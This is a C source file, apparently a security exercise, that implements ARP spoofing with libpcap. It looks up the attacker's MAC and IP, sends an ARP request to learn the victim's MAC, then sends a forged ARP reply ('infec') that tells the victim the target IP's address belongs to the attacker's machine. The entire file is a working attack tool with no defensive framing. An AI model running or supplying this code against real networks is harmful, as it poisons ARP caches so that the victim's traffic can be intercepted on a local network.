#include <pcap.h>
#include <arpa/inet.h>
#include <netinet/in_systm.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <stdio.h>
#include <string.h>
#include <header.h>

u_int8_t BROAD_ETH_MAC[] = "\xff\xff\xff\xff\xff\xff";
u_int8_t BROAD_ARP_MAC[] = "\x00\x00\x00\x00\x00\x00";

struct libnet_ethernet_hdr ethH;
struct libnet_arp_hdr req, infec;
struct add {
	u_int32_t ip;
	u_int8_t mac[6];
}attack, sender, target;

void get_Attacker(char* dev) {
	int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
	struct ifreq s;
	strcpy(s.ifr_name, dev);

	ioctl(fd, SIOCGIFHWADDR, &s);
	memcpy(attack.mac, s.ifr_hwaddr.sa_data, sizeof(s.ifr_hwaddr.sa_data));

	ioctl(fd, SIOCGIFADDR, &s);
	memcpy(&attack.ip, (void*)&(((struct sockaddr_in *)&s.ifr_addr)->sin_addr), sizeof(((struct sockaddr_in *)&s.ifr_addr)->sin_addr));
}

void set_eth(u_int8_t* src_mac, u_int8_t* dst_mac, u_int16_t ether_type) {
	memcpy(ethH.ether_shost, src_mac, ETHER_ADDR_LEN);
	memcpy(ethH.ether_dhost, dst_mac, ETHER_ADDR_LEN);
	ethH.ether_type = ntohs(ether_type);
}

void set_arp(struct libnet_arp_hdr* a, u_int16_t arp_op, u_int8_t* src_mac, u_int32_t src_ip, u_int8_t* dst_mac, u_int32_t dst_ip) {
	a->ar_hrd = ntohs(ARPHRD_ETHER);
	a->ar_pro = ntohs(ETHERTYPE_IP);
	a->ar_hln = 6;
	a->ar_pln = 4;
	a->ar_op = ntohs(arp_op);
	memcpy(a->ar_sha, src_mac, ETHER_ADDR_LEN);
	a->ar_spa = src_ip;
	memcpy(a->ar_tha, dst_mac, ETHER_ADDR_LEN);
	a->ar_tpa = dst_ip;
}

void make_arp_packet(u_int8_t* packet, struct libnet_arp_hdr* a) {
	memcpy(packet, &ethH, sizeof(struct libnet_ethernet_hdr));
        memcpy(packet+sizeof(struct libnet_ethernet_hdr), a, sizeof(struct libnet_arp_hdr));
}

int main(int argc, char* argv[]) {

	if (argc != 4) {
		return -1;
	}

	char* dev = argv[1];
	get_Attacker(dev);				// get attacker ip, mac
	inet_pton(AF_INET, argv[2], &sender.ip);	// get sender ip
	inet_pton(AF_INET, argv[3], &target.ip);	// get target ip

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}

	u_int8_t size = sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr);
	u_int8_t arp_packet[size], infec_packet[size];

	set_eth(attack.mac, BROAD_ETH_MAC, ETHERTYPE_ARP);
	set_arp(&req, ARPOP_REQUEST, attack.mac, attack.ip, BROAD_ARP_MAC, sender.ip);
	make_arp_packet(arp_packet, &req);
	pcap_sendpacket(handle, arp_packet, size);

	while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == -1 || res == -2) break;

		struct libnet_ethernet_hdr* replyehtH = (struct libnet_ethernet_hdr *)packet;

		if(ntohs(replyehtH->ether_type) == ETHERTYPE_ARP) {
			packet += sizeof(struct libnet_ethernet_hdr);
			struct libnet_arp_hdr* reply = (struct libnet_arp_hdr *)packet;
			if(req.ar_tpa == reply->ar_spa){
				memcpy(sender.mac, reply->ar_sha, ETHER_ADDR_LEN);		// get sender mac
				break;
			}
		}
	}

	set_eth(attack.mac, sender.mac, ETHERTYPE_ARP);
	set_arp(&infec, ARPOP_REPLY, attack.mac, target.ip, sender.mac, sender.ip);
	make_arp_packet(infec_packet, &infec);
	pcap_sendpacket(handle, infec_packet, size);

	pcap_close(handle);

	return 0;
}
